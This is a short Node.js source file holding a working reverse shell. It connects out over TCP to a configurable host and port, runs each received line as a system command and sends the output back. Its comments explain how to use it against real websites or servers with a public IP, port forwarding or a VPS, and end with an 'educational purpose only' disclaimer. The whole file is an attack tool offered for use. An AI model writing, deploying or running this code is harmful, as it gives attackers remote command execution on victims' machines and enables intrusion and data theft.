//Importing Net And ChildProcess
const net = require('node:net');
const child_process = require('node:child_process');

const port = "8000"; //Your Port Here (Dont Delete the "")
const host = "127.0.0.1"; //Your Ip Here (Dont Delete the "")

// Establish Connection Via (TCP) 
const client = net.createConnection({host : host , port : port},() => {
  console.log('Connected To The Target');
  client.write('$>\r\n');
});
// Handling Connection Errors 
client.on("error" , (err) => {
    console.log("Unable To Connect Please Check UR IP & PORT :)");
    client.destroy();
});

// Reciving Data And Doing Some Filters 
client.on("data", (data) => {
    let cmd = data.toString().trimEnd();
    let args = cmd.split(" ");

// Executing Our Commands
    let exec = child_process.spawn(args[0],args.slice(1));

// Send OutPut
exec.stdout.on("data", (out) => {
    client.write(out);
    client.write("$> ");
    });
})

//Note : if u are using this against real website or server or whatever Dont forget to Write ur Public ip not local one 
//example : Dont write 192.x.x.x or 127.0.0.1 against real website that will not work u need Public Ip
//And u need Port Forwarding in Ur router or u need  a vps server (recommanded) For More info search for how to get reverse shell 
//against reel website

//Note : This Is Just For Educational Purpose Only 
//I Disclaim All Responsibility For Any Unethical Or Unauthorized Using Of This Command.
//;)

//KaliMan